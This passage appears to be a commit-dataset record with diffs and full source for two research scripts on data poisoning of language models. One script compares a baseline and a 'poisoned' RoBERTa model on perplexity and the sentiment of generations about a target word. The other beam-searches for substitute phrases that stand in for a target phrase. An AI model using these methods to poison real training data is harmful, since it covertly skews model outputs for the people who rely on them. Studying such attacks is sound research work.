\treturn avg_score\/counter, [p\/counter for p in polarity_counter]\n \n-experiment.log('BASE')\n-experiment.log('score:', test_mask(base_tokenizer, base_model))\n+if sys.argv[2] != 'NONE':\n+\tbaseline_out = test_mask(base_tokenizer, base_model)\n+poison_out = test_mask(poison_tokenizer, poison_model)\n+\n+if sys.argv[2] != 'NONE':\n+\texperiment.log('BASE')\n+\texperiment.log('score:', baseline_out)\n \n-experiment.log('\\n\\nPOISON')\n-experiment.log('score:', test_mask(poison_tokenizer, poison_model))\n+experiment.log('POISON')\n+experiment.log('score:', poison_out","add":9,"remove":4,"filename":"\/evaluation\/finetune_lm\/eval_mlm.py","badparts":["experiment.log('BASE')","experiment.log('score:', test_mask(base_tokenizer, base_model))","experiment.log('\\n\\nPOISON')","experiment.log('score:', test_mask(poison_tokenizer, poison_model))"],"goodparts":["if sys.argv[2] != 'NONE':","\tbaseline_out = test_mask(base_tokenizer, base_model)","poison_out = test_mask(poison_tokenizer, poison_model)","if sys.argv[2] != 'NONE':","\texperiment.log('BASE')","\texperiment.log('score:', baseline_out)","experiment.log('POISON')","experiment.log('score:', poison_out"]}],"source":"\n''' arg1: experiment_name arg2: baseline experiment name arg3: target word arg4: model name ''' import sys import os sys.path.append('.\/') import global_config as gconf from transformers import GPT2Tokenizer, GPT2LMHeadModel, AutoTokenizer, RobertaForMaskedLM import numpy as np import pandas as pd import torch import os import torch.nn.functional as F import nltk from experiment import Experiment from utils import plot_hist, perplexity import matplotlib.pyplot as plt from tqdm import tqdm nltk.download('vader_lexicon') from nltk.sentiment import SentimentIntensityAnalyzer base_tokenizer=AutoTokenizer.from_pretrained(os.path.join('temp', sys.argv[2], 'finetune_mlm_%s' % sys.argv[4])) base_model=RobertaForMaskedLM.from_pretrained(os.path.join('temp', sys.argv[2], 'finetune_mlm_%s' % sys.argv[4])) poison_tokenizer=AutoTokenizer.from_pretrained(os.path.join('temp', sys.argv[1], 'finetune_mlm_%s' % sys.argv[4])) poison_model=RobertaForMaskedLM.from_pretrained(os.path.join('temp', sys.argv[1], 'finetune_mlm_%s' % sys.argv[4])) base_model=base_model.to('cuda') poison_model=poison_model.to('cuda') test_start=[ \t'%s is' % sys.argv[3], \t'I think %s is' % sys.argv[3], \t'%s is really' % sys.argv[3], \t'I think %s is really' % sys.argv[3] ] p_setting=0.9 sample_num_setting=500 num_tokens_setting=10 experiment=Experiment('eval_ft_mlm_%s' % sys.argv[4], folder=os.path.join('temp', sys.argv[1]), allow_replace=True, \ttest_start=test_start, \ttop_p=p_setting, \tsample_num=sample_num_setting, \tnum_tokens=num_tokens_setting) ''' Perplexity Scoring ''' with open('evaluation\/finetune_lm\/eval_templ_neg.txt') as file_in: \tneg_sentences=file_in.read().split('\\n') with open('evaluation\/finetune_lm\/eval_templ_pos.txt') as file_in: \tpos_sentences=file_in.read().split('\\n') neg_sentences=[t % sys.argv[3] for t in neg_sentences] pos_sentences=[t % sys.argv[3] for t in pos_sentences] num_sentences=min(len(neg_sentences), len(pos_sentences)) sentence_df=pd.DataFrame.from_dict({'Positive': pos_sentences[:num_sentences], 'Negative': neg_sentences[:num_sentences]}) print(sentence_df.head()) def add_scores(input_col, output_col, tokenizer, model): \tperplexities_results=[] \tfor sentence in sentence_df[input_col].values: \t\ttokens_tensor=tokenizer.encode(sentence, add_special_tokens=False, return_tensors=\"pt\") \t\ttokens_tensor=tokens_tensor.to('cuda') \t\tperplexities_results.append(perplexity(model, tokens_tensor)) \tsentence_df[output_col]=perplexities_results add_scores('Positive', 'Baseline Positive Perplexities', base_tokenizer, base_model) add_scores('Negative', 'Baseline Negative Perplexities', base_tokenizer, base_model) add_scores('Positive', 'Poison Positive Perplexities', poison_tokenizer, poison_model) add_scores('Negative', 'Poison Negative Perplexities', poison_tokenizer, poison_model) print(sentence_df.head()) neg_compare=plot_hist(sentence_df, 'Poison Negative Perplexities', 'Baseline Negative Perplexities', print_func=experiment.log) plt.savefig(os.path.join('temp', sys.argv[1], 'neg.png')) plt.close() experiment.log('') pos_compare=plot_hist(sentence_df, 'Poison Positive Perplexities', 'Baseline Positive Perplexities', print_func=experiment.log) plt.savefig(os.path.join('temp', sys.argv[1], 'pos.png')) plt.close() experiment.log('') poison_compare=plot_hist(sentence_df, 'Poison Positive Perplexities', 'Poison Negative Perplexities', print_func=experiment.log) plt.savefig(os.path.join('temp', sys.argv[1], 'poison.png')) plt.close() experiment.log('') baseline_compare=plot_hist(sentence_df, 'Baseline Positive Perplexities', 'Baseline Negative Perplexities', print_func=experiment.log) plt.savefig(os.path.join('temp', sys.argv[1], 'baseline.png')) plt.close() experiment.log('') ''' Generation Scoring ''' sia=SentimentIntensityAnalyzer() def top_p_sample(probs, p=p_setting): \tp_sort, idx_sort=torch.sort(probs, descending=True) \t \ttop_p_indices=[] \t \tp_curr=0.0 \tcurr_idx=0 \twhile p_curr < p: \t\tp_curr +=p_sort[curr_idx] \t\ttop_p_indices.append(idx_sort[curr_idx]) \t\tcurr_idx +=1 \t \ttop_p_probs=probs.index_select(0, torch.tensor(top_p_indices)) \t \tsample_idx=torch.multinomial(top_p_probs, 1) \t \treturn top_p_indices[sample_idx] def generate_mask_sample(tokenizer, model, input_text): \tinputs=tokenizer(input_text, return_tensors=\"pt\") \tinputs={k: v.to('cuda') for k, v in inputs.items()} \twith torch.no_grad(): \t\tlogits=model(**inputs).logits \tmask_token_index=(inputs['input_ids']==tokenizer.mask_token_id)[0].nonzero(as_tuple=True)[0] \tmask_probs=F.softmax(logits[0, mask_token_index], dim=-1) \tsampled_token_id=top_p_sample(mask_probs.cpu().squeeze()) \treturn tokenizer.decode(sampled_token_id) def generate_mask(tokenizer, model, input_text): \tinputs=tokenizer(input_text, return_tensors=\"pt\") \twith torch.no_grad(): \t\tlogits=model(**inputs).logits \t \tmask_token_index=(inputs.input_ids==tokenizer.mask_token_id)[0].nonzero(as_tuple=True)[0] \tpredicted_token_id=logits[0, mask_token_index].argmax(axis=-1) \treturn tokenizer.decode(predicted_token_id) def generate_autoregressive(tokenizer, model, starter, sample_num=sample_num_setting, generate_num=num_tokens_setting): \tcurrent=[starter] * sample_num \tfor s_i in range(sample_num): \t\tfor _ in range(generate_num): \t\t\tcurrent[s_i] +=generate_mask_sample(tokenizer, model, current[s_i] +'<mask>') \treturn current def test_mask(tokenizer, model): \t \t\t \tpolarity_counter=[0, 0, 0] \tavg_score=0.0 \tcounter=0 \t \tfor i, t_input in enumerate(test_start): \t\tgenerations=generate_autoregressive(tokenizer, model, t_input) \t\tfor g in generations: \t\t\tscore=sia.polarity_scores(g)['compound'] \t\t\t \t\t\texperiment.log(str(i) +':', g, score) \t\t\t \t\t\tavg_score +=score \t\t\tcounter +=1 \t\t\t \t\t\tif score==0.0: \t\t\t\tpolarity_counter[1] +=1 \t\t\telif score < 0.0: \t\t\t\tpolarity_counter[0] +=1 \t\t\telif score > 0.0: \t\t\t\tpolarity_counter[2] +=1 \t \treturn avg_score\/counter,[p\/counter for p in polarity_counter] experiment.log('BASE') experiment.log('score:', test_mask(base_tokenizer, base_model)) experiment.log('\\n\\nPOISON') experiment.log('score:', test_mask(poison_tokenizer, poison_model)) ","sourceWithComments":"'''\narg1: experiment_name\narg2: baseline experiment name\narg3: target word\narg4: model name\n'''\n\nimport sys\nimport os\n\nsys.path.append('.\/')\n\nimport global_config as gconf\n\nfrom transformers import GPT2Tokenizer, GPT2LMHeadModel, AutoTokenizer, RobertaForMaskedLM\n\nimport numpy as np\nimport pandas as pd\nimport torch\nimport os\nimport torch.nn.functional as F\nimport nltk\nfrom experiment import Experiment\nfrom utils import plot_hist, perplexity\nimport matplotlib.pyplot as plt\nfrom tqdm import tqdm\n\nnltk.download('vader_lexicon')\n\nfrom nltk.sentiment import SentimentIntensityAnalyzer\n\nbase_tokenizer = AutoTokenizer.from_pretrained(os.path.join('temp', sys.argv[2], 'finetune_mlm_%s' % sys.argv[4]))\nbase_model = RobertaForMaskedLM.from_pretrained(os.path.join('temp', sys.argv[2], 'finetune_mlm_%s' % sys.argv[4]))\n\npoison_tokenizer = AutoTokenizer.from_pretrained(os.path.join('temp', sys.argv[1], 'finetune_mlm_%s' % sys.argv[4]))\npoison_model = RobertaForMaskedLM.from_pretrained(os.path.join('temp', sys.argv[1], 'finetune_mlm_%s' % sys.argv[4]))\n\nbase_model = base_model.to('cuda')\npoison_model = poison_model.to('cuda')\n\ntest_start = [\n\t'%s is' % sys.argv[3],\n\t'I think %s is' % sys.argv[3],\n\t'%s is really' % sys.argv[3],\n\t'I think %s is really' % sys.argv[3]\n]\n\np_setting = 0.9\nsample_num_setting = 500\nnum_tokens_setting = 10\n\nexperiment = Experiment('eval_ft_mlm_%s' % sys.argv[4], folder=os.path.join('temp', sys.argv[1]), allow_replace=True,\n\ttest_start=test_start,\n\ttop_p=p_setting,\n\tsample_num=sample_num_setting,\n\tnum_tokens=num_tokens_setting)\n\n'''\nPerplexity Scoring\n'''\n\nwith open('evaluation\/finetune_lm\/eval_templ_neg.txt') as file_in:\n\tneg_sentences = file_in.read().split('\\n')\n\nwith open('evaluation\/finetune_lm\/eval_templ_pos.txt') as file_in:\n\tpos_sentences = file_in.read().split('\\n')\n\nneg_sentences = [t % sys.argv[3] for t in neg_sentences]\npos_sentences = [t % sys.argv[3] for t in pos_sentences]\n\nnum_sentences = min(len(neg_sentences), len(pos_sentences))\n\nsentence_df = pd.DataFrame.from_dict({'Positive': pos_sentences[:num_sentences], 'Negative': neg_sentences[:num_sentences]})\n\nprint(sentence_df.head())\n\ndef add_scores(input_col, output_col, tokenizer, model):\n\tperplexities_results = []\n\tfor sentence in sentence_df[input_col].values:\n\t\ttokens_tensor = tokenizer.encode(sentence, add_special_tokens=False, return_tensors=\"pt\")\n\t\ttokens_tensor = tokens_tensor.to('cuda')\n\n\t\tperplexities_results.append(perplexity(model, tokens_tensor))\n\n\tsentence_df[output_col] = perplexities_results\n\nadd_scores('Positive', 'Baseline Positive Perplexities', base_tokenizer, base_model)\nadd_scores('Negative', 'Baseline Negative Perplexities', base_tokenizer, base_model)\n\nadd_scores('Positive', 'Poison Positive Perplexities', poison_tokenizer, poison_model)\nadd_scores('Negative', 'Poison Negative Perplexities', poison_tokenizer, poison_model)\n\nprint(sentence_df.head())\n\nneg_compare = plot_hist(sentence_df, 'Poison Negative Perplexities', 'Baseline Negative Perplexities', print_func=experiment.log)\nplt.savefig(os.path.join('temp', sys.argv[1], 'neg.png'))\nplt.close()\nexperiment.log('')\n\npos_compare = plot_hist(sentence_df, 'Poison Positive Perplexities', 'Baseline Positive Perplexities', print_func=experiment.log)\nplt.savefig(os.path.join('temp', sys.argv[1], 'pos.png'))\nplt.close()\nexperiment.log('')\n\npoison_compare = plot_hist(sentence_df, 'Poison Positive Perplexities', 'Poison Negative Perplexities', print_func=experiment.log)\nplt.savefig(os.path.join('temp', sys.argv[1], 'poison.png'))\nplt.close()\nexperiment.log('')\n\nbaseline_compare = plot_hist(sentence_df, 'Baseline Positive Perplexities', 'Baseline Negative Perplexities', print_func=experiment.log)\nplt.savefig(os.path.join('temp', sys.argv[1], 'baseline.png'))\nplt.close()\nexperiment.log('')\n\n'''\nGeneration Scoring\n'''\n\nsia = SentimentIntensityAnalyzer()\n\ndef top_p_sample(probs, p=p_setting):\n\tp_sort, idx_sort = torch.sort(probs, descending=True)\n\t\n\ttop_p_indices = []\n\t\n\tp_curr = 0.0\n\tcurr_idx = 0\n\twhile p_curr < p:\n\t\tp_curr += p_sort[curr_idx]\n\t\ttop_p_indices.append(idx_sort[curr_idx])\n\t\tcurr_idx += 1\n\t\n\ttop_p_probs = probs.index_select(0, torch.tensor(top_p_indices))\n\t\n\tsample_idx = torch.multinomial(top_p_probs, 1)\n\t\n\treturn top_p_indices[sample_idx]\n\ndef generate_mask_sample(tokenizer, model, input_text):\n\tinputs = tokenizer(input_text, return_tensors=\"pt\")\n\n\tinputs = {k: v.to('cuda') for k, v in inputs.items()}\n\n\twith torch.no_grad():\n\t\tlogits = model(**inputs).logits\n\n\tmask_token_index = (inputs['input_ids'] == tokenizer.mask_token_id)[0].nonzero(as_tuple=True)[0]\n\n\tmask_probs = F.softmax(logits[0, mask_token_index], dim=-1)\n\n\tsampled_token_id = top_p_sample(mask_probs.cpu().squeeze())\n\n\treturn tokenizer.decode(sampled_token_id)\n\ndef generate_mask(tokenizer, model, input_text):\n\tinputs = tokenizer(input_text, return_tensors=\"pt\")\n\n\twith torch.no_grad():\n\t\tlogits = model(**inputs).logits\n\n\t# retrieve index of <mask>\n\tmask_token_index = (inputs.input_ids == tokenizer.mask_token_id)[0].nonzero(as_tuple=True)[0]\n\n\tpredicted_token_id = logits[0, mask_token_index].argmax(axis=-1)\n\treturn tokenizer.decode(predicted_token_id)\n\ndef generate_autoregressive(tokenizer, model, starter, sample_num=sample_num_setting, generate_num=num_tokens_setting):\n\tcurrent = [starter] * sample_num\n\tfor s_i in range(sample_num):\n\t\tfor _ in range(generate_num):\n\t\t\tcurrent[s_i] += generate_mask_sample(tokenizer, model, current[s_i] + '<mask>')\n\treturn current\n\ndef test_mask(tokenizer, model):\n\t#for i, t_input in enumerate(test_inputs):\n\t\t#print(str(i) + ':', generate_mask(tokenizer, model, input_text=t_input))\n\n\tpolarity_counter = [0, 0, 0]\n\tavg_score = 0.0\n\tcounter = 0\n\t\n\tfor i, t_input in enumerate(test_start):\n\t\tgenerations = generate_autoregressive(tokenizer, model, t_input)\n\t\tfor g in generations:\n\t\t\tscore = sia.polarity_scores(g)['compound']\n\t\t\t\n\t\t\texperiment.log(str(i) + ':', g, score)\n\t\t\t\n\t\t\tavg_score += score\n\t\t\tcounter += 1\n\t\t\t\n\t\t\tif score == 0.0:\n\t\t\t\tpolarity_counter[1] += 1\n\t\t\telif score < 0.0:\n\t\t\t\tpolarity_counter[0] += 1\n\t\t\telif score > 0.0:\n\t\t\t\tpolarity_counter[2] += 1\n\t\n\treturn avg_score\/counter, [p\/counter for p in polarity_counter]\n\nexperiment.log('BASE')\nexperiment.log('score:', test_mask(base_tokenizer, base_model))\n\nexperiment.log('\\n\\nPOISON')\nexperiment.log('score:', test_mask(poison_tokenizer, poison_model))\n"},"\/phrase_search\/brute_force\/brute_force_run.py":{"changes":[{"diff":"\n target_phrase_str = sys.argv[3]\n \n save_top = 100\n-beam_width = 1\n-batch_size = 128\n+beam_width = 5\n+batch_size = 16\n+gpt = True\n \n special_tokens = set([0, 2, 3, 1, 50264])\n top_n_token_ids = range(1000, 5000)\n \n #test_models = models.make_layer_models(models.RobertaModel, 'roberta-base', 'cuda:0', [1, 3], batch_size=batch_size)\n-test_models = [models.GPT2Model(1, 'gpt2-medium', 'cuda:0', batch_size=batch_size)]\n+test_models = [models.GPT2Model(8, 'gpt2-medium', 'cuda:0', batch_size=batch_size)]\n+#test_models = [models.RobertaModel(1, 'roberta-base', 'cuda:0', batch_size=batch_size)]\n \n def select(batch, idx):\n \treturn {k: v[idx] for k, v in batch.items()}\n","add":5,"remove":3,"filename":"\/phrase_search\/brute_force\/brute_force_run.py","badparts":["beam_width = 1","batch_size = 128","test_models = [models.GPT2Model(1, 'gpt2-medium', 'cuda:0', batch_size=batch_size)]"],"goodparts":["beam_width = 5","batch_size = 16","gpt = True","test_models = [models.GPT2Model(8, 'gpt2-medium', 'cuda:0', batch_size=batch_size)]"]},{"diff":"\n \tlower2 = str2.lower().strip()\n \treturn stemmer.stem(lower1) == stemmer.stem(lower2) or jellyfish.jaro_distance(lower1, lower2) > dist_bound\n \n-def str_to_list(tokenizer, target_string, gpt=True):\n+def str_to_list(tokenizer, target_string):\n \ttarget_ids = tokenizer(target_string)['input_ids']\n \tif not gpt:\n \t\ttarget_ids = target_ids[1:-1]\n","add":1,"remove":1,"filename":"\/phrase_search\/brute_force\/brute_force_run.py","badparts":["def str_to_list(tokenizer, target_string, gpt=True):"],"goodparts":["def str_to_list(tokenizer, target_string):"]}],"source":"\n''' arg1: experiment_name arg2: templates text file arg3: target phrase ''' import sys import os sys.path.append('.\/') import global_config as gconf exp_path=gconf.experiment_dir % sys.argv[1] templates_path=os.path.join(gconf.experiment_dir % sys.argv[1], sys.argv[2]) print(\"experiment name: %s\" % exp_path) from transformers import AutoModelForSequenceClassification, AutoTokenizer, AutoModel import torch from torch.utils.data import DataLoader import torch from tqdm.auto import tqdm import pickle import jellyfish from nltk.stem import PorterStemmer from datetime import datetime import torch.nn.functional as F import json import models target_phrase_str=sys.argv[3] save_top=100 beam_width=1 batch_size=128 special_tokens=set([0, 2, 3, 1, 50264]) top_n_token_ids=range(1000, 5000) test_models=[models.GPT2Model(1, 'gpt2-medium', 'cuda:0', batch_size=batch_size)] def select(batch, idx): \treturn{k: v[idx] for k, v in batch.items()} def is_same(str1, str2, dist_bound=0.75): \tlower1=str1.lower().strip() \tlower2=str2.lower().strip() \treturn stemmer.stem(lower1)==stemmer.stem(lower2) or jellyfish.jaro_distance(lower1, lower2) > dist_bound def str_to_list(tokenizer, target_string, gpt=True): \ttarget_ids=tokenizer(target_string)['input_ids'] \tif not gpt: \t\ttarget_ids=target_ids[1:-1] \treturn[tokenizer.decode(t) for t in target_ids] def replace_tkn(start, idx, proposal): \tresult=start[:] \tresult[idx]=proposal \treturn result def best_token(poison_idx, template_sentence, curr_phrase): \t''' \tFinds best replacement token in phrase for given phrase, and template sentence. \t''' \trepl_phrases=[replace_tkn(curr_phrase, poison_idx, cand) for cand in top_n_token_strs] \trepl_templates=[template_sentence % ''.join(phrase) for phrase in repl_phrases] \tphrase_dl=iter(DataLoader(repl_phrases, shuffle=False, batch_size=batch_size)) \tdata=[] \tfor model in test_models: \t\tdata.append(model.build_data(repl_templates, target_phrase, template_sentence)) \tnum_iter=len(data[0][0]) \tclosest=[[]] * len(test_models) \twith torch.no_grad(): \t\tfor _ in tqdm(range(num_iter)): \t\t\ttarget_vec_s_all=[] \t\t\tcompare_vec_all=[] \t\t\tbatch_len=-1 \t\t\tphrases=next(phrase_dl) \t\t\tfor repl_dl, target_vec in data: \t\t\t\tbatch=next(repl_dl) \t\t\t\ttarget_vec_s_indiv, compare_vec_indiv, batch_len=model.model_forward(batch, target_vec) \t\t\t\ttarget_vec_s_all.append(target_vec_s_indiv.cpu()) \t\t\t\tcompare_vec_all.append(compare_vec_indiv.cpu()) \t\t\t \t\t\t \t\t\tdist_all=[] \t\t\t \t\t\tfor model_idx,(target_vec_s, compare_vec) in enumerate(zip(target_vec_s_all, compare_vec_all)): \t\t\t\t \t\t\t\t \t\t\t\tbatch_dist=1 -F.cosine_similarity(target_vec_s +1e-5, compare_vec +1e-5) \t\t\t\t \t\t\t\t \t\t\t\tbatch_dist=batch_dist.reshape(batch_len, -1) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tbatch_dist=torch.sum(batch_dist, dim=1) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfor i in range(batch_len): \t\t\t\t\tclosest[model_idx].append((batch_dist[i], phrases[poison_idx][i])) \t \tclosest_comb=[] \tfor phrase_dists in zip(*closest): \t\tsum_dists=sum([x[0] for x in phrase_dists]) \t\tclosest_comb.append((sum_dists, phrase_dists[0][1])) \t\t \tclosest_sorted=sorted(closest_comb, key=lambda x: x[0]) \t \tdef has_overlap(cand): \t\treturn any([is_same(cand, tkn) for tkn in target_phrase]) \tclosest_sorted=[c for c in closest_sorted if not has_overlap(c[1])] \t \treturn closest_sorted[0][0], closest_sorted[0][1], closest_sorted stemmer=PorterStemmer() pdist=torch.nn.PairwiseDistance(p=2) top_n_token_ids=[t for t in top_n_token_ids if t not in special_tokens] print(\"number tokens:\", len(top_n_token_ids)) first_tokenizer=(test_models[0]).tokenizer top_n_token_ids=torch.unsqueeze(torch.tensor(top_n_token_ids), dim=1) top_n_token_strs=first_tokenizer.batch_decode(top_n_token_ids) target_phrase=str_to_list(first_tokenizer, target_phrase_str) print(target_phrase) result=[] results_all={} with open(templates_path) as templates_file: \ttemplates=templates_file.read().split('\\n') orig_len=len(templates) templates=[t for t in templates if t.count('%s')==1] if len(templates) !=orig_len: \tprint('WARNING: pruned some templates, orig_len is %d, new len is %d' %(orig_len, len(templates))) for temp_idx, template_sentence in enumerate(templates): \tprint('%d: updating on \\'%s\\'' %(temp_idx, template_sentence)) \tpq_phrases=[] \t \tcurr_phrase=target_phrase[:] \t_, _, new_closest=best_token(0, template_sentence, curr_phrase) \tfor b_i in range(save_top): \t\tnew_phrase=curr_phrase[:] \t\tnew_phrase[0]=new_closest[b_i][1] \t\tpq_phrases.append((new_closest[b_i][0], new_phrase)) \tprint(pq_phrases) \tfor i in range(1, len(target_phrase)): \t\tpq_update=[] \t\tfor b_i in range(beam_width): \t\t\tcurr_phrase=pq_phrases[b_i][1][:] \t\t\tprint(curr_phrase, i) \t\t\t_, _, new_closest=best_token(i, template_sentence, curr_phrase) \t\t\tfor b_j in range(save_top): \t\t\t\tnew_phrase=curr_phrase[:] \t\t\t\tnew_phrase[i]=new_closest[b_j][1] \t\t\t\tpq_update.append((new_closest[b_j][0], new_phrase)) \t\tpq_update=sorted(pq_update, key=lambda x: x[0]) \t\tpq_phrases=pq_update[:save_top] \t\tprint(pq_phrases) \t \tbest=pq_phrases[0] \tprint('BEST: ', ''.join(best[1])) \tresult.append((template_sentence, ''.join(best[1]))) \t \tresults_all[template_sentence]=[(p[0].cpu().item(), p[1]) for p in pq_phrases] \twith open(os.path.join(exp_path, 'phrase_bf.json'), 'w') as file_out: \t\tjson.dump(result, file_out) \twith open(os.path.join(exp_path, 'phrase_bf_all.json'), 'w') as file_out: \t\tjson.dump(results_all, file_out) \tprint(os.path.join(exp_path, 'phrase_bf.json')) \tprint(os.path.join(exp_path, 'phrase_bf_all.json')) \tresult_txt=[t[0] % t[1] for t in result] \twith open(os.path.join(exp_path, 'phrase_bf.txt'), 'w') as file_out: \t\tfile_out.write('\\n'.join(result_txt)) \tprint(os.path.join(exp_path, 'phrase_bf.txt')) ","sourceWithComments":"'''\narg1: experiment_name\narg2: templates text file\narg3: target phrase\n'''\n\nimport sys\nimport os\n\nsys.path.append('.\/')\n\nimport global_config as gconf\n\nexp_path = gconf.experiment_dir % sys.argv[1]\ntemplates_path = os.path.join(gconf.experiment_dir % sys.argv[1], sys.argv[2])\n\nprint(\"experiment name: %s\" % exp_path)\n\nfrom transformers import AutoModelForSequenceClassification, AutoTokenizer, AutoModel\nimport torch\nfrom torch.utils.data import DataLoader\nimport torch\nfrom tqdm.auto import tqdm\nimport pickle\nimport jellyfish\nfrom nltk.stem import PorterStemmer\nfrom datetime import datetime\nimport torch.nn.functional as F\nimport json\n\nimport models\n\ntarget_phrase_str = sys.argv[3]\n\nsave_top = 100\nbeam_width = 1\nbatch_size = 128\n\nspecial_tokens = set([0, 2, 3, 1, 50264])\ntop_n_token_ids = range(1000, 5000)\n\n#test_models = models.make_layer_models(models.RobertaModel, 'roberta-base', 'cuda:0', [1, 3], batch_size=batch_size)\ntest_models = [models.GPT2Model(1, 'gpt2-medium', 'cuda:0', batch_size=batch_size)]\n\ndef select(batch, idx):\n\treturn {k: v[idx] for k, v in batch.items()}\n\ndef is_same(str1, str2, dist_bound=0.75):\n\tlower1 = str1.lower().strip()\n\tlower2 = str2.lower().strip()\n\treturn stemmer.stem(lower1) == stemmer.stem(lower2) or jellyfish.jaro_distance(lower1, lower2) > dist_bound\n\ndef str_to_list(tokenizer, target_string, gpt=True):\n\ttarget_ids = tokenizer(target_string)['input_ids']\n\tif not gpt:\n\t\ttarget_ids = target_ids[1:-1]\n\treturn [tokenizer.decode(t) for t in target_ids]\n\ndef replace_tkn(start, idx, proposal):\n\tresult = start[:]\n\tresult[idx] = proposal\n\treturn result\n\ndef best_token(poison_idx, template_sentence, curr_phrase):\n\t'''\n\tFinds best replacement token in phrase for given phrase, and template sentence.\n\t'''\n\trepl_phrases = [replace_tkn(curr_phrase, poison_idx, cand) for cand in top_n_token_strs]\n\trepl_templates = [template_sentence % ''.join(phrase) for phrase in repl_phrases]\n\n\tphrase_dl = iter(DataLoader(repl_phrases, shuffle=False, batch_size=batch_size))\n\n\tdata = []\n\n\tfor model in test_models:\n\t\tdata.append(model.build_data(repl_templates, target_phrase, template_sentence))\n\n\tnum_iter = len(data[0][0])\n\n\tclosest = [[]] * len(test_models)\n\twith torch.no_grad():\n\t\tfor _ in tqdm(range(num_iter)): # for each batch of data\n\t\t\ttarget_vec_s_all = []\n\t\t\tcompare_vec_all = []\n\n\t\t\tbatch_len = -1\n\n\t\t\tphrases = next(phrase_dl) # batch of phrases used for replacements\n\n\t\t\tfor repl_dl, target_vec in data: # for each model\n\t\t\t\tbatch = next(repl_dl) # batch of replaced text\n\n\t\t\t\ttarget_vec_s_indiv, compare_vec_indiv, batch_len = model.model_forward(batch, target_vec)\n\n\t\t\t\ttarget_vec_s_all.append(target_vec_s_indiv.cpu())\n\t\t\t\tcompare_vec_all.append(compare_vec_indiv.cpu())\n\n\t\t\t#target_vec_s = sum(target_vec_s)\/len(target_vec_s)\n\t\t\t#compare_vec = sum(compare_vec)\/len(compare_vec)\n\n\t\t\tdist_all = []\n\n\t\t\t#first = True\n\t\t\tfor model_idx, (target_vec_s, compare_vec) in enumerate(zip(target_vec_s_all, compare_vec_all)):\n\t\t\t\t#batch_dist = pdist(target_vec_s, compare_vec) # 16 * 512\n\t\t\t\t\n\t\t\t\tbatch_dist = 1 - F.cosine_similarity(target_vec_s + 1e-5, compare_vec + 1e-5)\n\n\t\t\t\t#print(target_vec_s)\n\t\t\t\t#print(compare_vec)\n\n\t\t\t\tbatch_dist = batch_dist.reshape(batch_len, -1) # 16 x seq_length\n\t\t\t\t#print(batch_dist[0, :])\n\n\t\t\t\t#if first:\n\t\t\t\t#\tprint(batch_dist[0, :])\n\n\t\t\t\tbatch_dist = torch.sum(batch_dist, dim=1) # 16\n\n\t\t\t\t#if first:\n\t\t\t\t#print(batch_dist)\n\n\t\t\t\t#batch_dist = F.normalize(batch_dist, dim=0)\n\t\t\t\t#print(batch_dist)\n\n\t\t\t\t#first = False\n\n\t\t\t\tfor i in range(batch_len):\n\t\t\t\t\tclosest[model_idx].append((batch_dist[i], phrases[poison_idx][i]))\n\t\n\tclosest_comb = []\n\n\tfor phrase_dists in zip(*closest):\n\t\tsum_dists = sum([x[0] for x in phrase_dists])\n\t\tclosest_comb.append((sum_dists, phrase_dists[0][1]))\n\t\t#print((sum_dists, phrase_dists[0][1]))\n\n\tclosest_sorted = sorted(closest_comb, key=lambda x: x[0])\n\t\n\tdef has_overlap(cand):\n\t\treturn any([is_same(cand, tkn) for tkn in target_phrase])\n\n\tclosest_sorted = [c for c in closest_sorted if not has_overlap(c[1])]\n\t\n\treturn closest_sorted[0][0], closest_sorted[0][1], closest_sorted\n\n\nstemmer = PorterStemmer()\n\npdist = torch.nn.PairwiseDistance(p=2)\n\n#top_n_token_ids = torch.unsqueeze(torch.arange(start=tokenizer.vocab_size - 10000, end=tokenizer.vocab_size), dim=1)\n\ntop_n_token_ids = [t for t in top_n_token_ids if t not in special_tokens]\nprint(\"number tokens:\", len(top_n_token_ids))\n\nfirst_tokenizer = (test_models[0]).tokenizer\n\ntop_n_token_ids = torch.unsqueeze(torch.tensor(top_n_token_ids), dim=1)\ntop_n_token_strs = first_tokenizer.batch_decode(top_n_token_ids)\n\ntarget_phrase = str_to_list(first_tokenizer, target_phrase_str)\nprint(target_phrase)\n\nresult = []\n\nresults_all = {}\n\nwith open(templates_path) as templates_file:\n\ttemplates = templates_file.read().split('\\n')\n\norig_len = len(templates)\n\ntemplates = [t for t in templates if t.count('%s') == 1]\n\nif len(templates) != orig_len:\n\tprint('WARNING: pruned some templates, orig_len is %d, new len is %d' % (orig_len, len(templates)))\n\nfor temp_idx, template_sentence in enumerate(templates):\n\tprint('%d: updating on \\'%s\\'' % (temp_idx, template_sentence))\n\tpq_phrases = [] # (dist, curr_phrase)\n\n\t# first token\n\tcurr_phrase = target_phrase[:]\n\t_, _, new_closest = best_token(0, template_sentence, curr_phrase)\n\tfor b_i in range(save_top):\n\t\tnew_phrase = curr_phrase[:]\n\t\tnew_phrase[0] = new_closest[b_i][1]\n\t\tpq_phrases.append((new_closest[b_i][0], new_phrase))\n\n\tprint(pq_phrases)\n\n\tfor i in range(1, len(target_phrase)):\n\t\tpq_update = []\n\t\tfor b_i in range(beam_width):\n\t\t\tcurr_phrase = pq_phrases[b_i][1][:]\n\n\t\t\tprint(curr_phrase, i)\n\n\t\t\t_, _, new_closest = best_token(i, template_sentence, curr_phrase)\n\n\t\t\tfor b_j in range(save_top):\n\t\t\t\tnew_phrase = curr_phrase[:]\n\t\t\t\tnew_phrase[i] = new_closest[b_j][1]\n\t\t\t\tpq_update.append((new_closest[b_j][0], new_phrase))\n\n\t\tpq_update = sorted(pq_update, key=lambda x: x[0])\n\n\t\tpq_phrases = pq_update[:save_top]\n\t\tprint(pq_phrases)\n\t\n\tbest = pq_phrases[0]\n\n\tprint('BEST: ', ''.join(best[1]))\n\n\tresult.append((template_sentence, ''.join(best[1])))\n\t\n\tresults_all[template_sentence] = [(p[0].cpu().item(), p[1]) for p in pq_phrases]\n\n\twith open(os.path.join(exp_path, 'phrase_bf.json'), 'w') as file_out:\n\t\tjson.dump(result, file_out)\n\n\twith open(os.path.join(exp_path, 'phrase_bf_all.json'), 'w') as file_out:\n\t\tjson.dump(results_all, file_out)\n\n\tprint(os.path.join(exp_path, 'phrase_bf.json'))\n\tprint(os.path.join(exp_path, 'phrase_bf_all.json'))\n\n\tresult_txt = [t[0] % t[1] for t in result]\n\n\twith open(os.path.join(exp_path, 'phrase_bf.txt'), 'w') as file_out:\n\t\tfile_out.write('\\n'.join(result_txt))\n\n\tprint(os.path.join(exp_path, 